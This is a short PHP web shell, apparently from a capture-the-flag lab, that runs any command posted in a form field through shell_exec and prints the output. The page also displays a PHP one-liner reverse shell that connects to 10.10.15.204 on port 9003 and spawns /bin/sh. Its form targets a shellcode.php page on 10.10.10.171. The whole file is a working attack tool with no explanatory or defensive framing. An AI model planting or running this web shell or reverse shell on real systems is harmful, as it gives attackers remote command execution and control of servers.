<?php
$command = $_POST['command'];
$output = shell_exec($command);
?>
<html>
<p> hello there</p>
<p>php -r '$sock=fsockopen("10.10.15.204",9003);exec("/bin/sh -i <&3 >&3 2>&3");'</p>
<form method="post" action="http://10.10.10.171/ona/shellcode.php">
<input name="command" value="">
<input type="submit" name="run command" value="Run">
</form>
<?php echo "<pre>$output</pre>"; ?>
</html>
